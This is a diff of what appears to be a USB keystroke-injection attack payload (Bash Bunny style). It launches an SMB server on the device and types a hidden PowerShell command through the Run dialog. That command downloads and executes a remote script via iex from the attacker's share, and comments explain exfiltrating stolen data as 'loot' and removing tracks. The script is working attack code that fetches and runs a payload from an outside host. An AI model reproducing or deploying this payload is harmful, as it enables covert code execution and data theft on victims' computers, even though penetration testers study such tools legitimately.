@@ -58,11 +58,14 @@ LOOTDIR_BB=${LOOTDIR_BB}/${HOST}-${COUNT}
 # START SMB SERVER
 LOGFILE=/tmp/l/psh_downloadsmb.log
 touch ${LOGFILE}
-python /tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp > ${LOGFILE} &
+python /tools/impacket/examples/smbserver.py -smb2support -comment 'Public Share' s /tmp > ${LOGFILE} &
 
 # STAGE 1 - POWERSHELL
 LED STAGE1
-RUN WIN "powershell -WindowStyle Hidden \"while (\$true) {If ((New-Object net.sockets.tcpclient(${HOST_IP},445)).Connected) {iex (New-Object Net.WebClient).DownloadString('\\\\${HOST_IP}\\s\\p\\p.txt');New-Item \\\\${HOST_IP}\\s\\COMPLETE -ItemType file;exit}}\""
+QUACK GUI r
+QUACK DELAY 2000
+QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) {If ((New-Object net.sockets.tcpclient(${HOST_IP},445)).Connected) {iex (New-Object Net.WebClient).DownloadString('\\\\${HOST_IP}\\s\\p\\p.txt');New-Item \\\\${HOST_IP}\\s\\COMPLETE -ItemType file;exit}}\""
+QUACK ENTER
 # TIP: To exfil any data, upload to \\172.16.64.1\s\l\ -- this will be copied to the BB as loot
 # TIP: Remove tracks in the psh payload if you wish
 
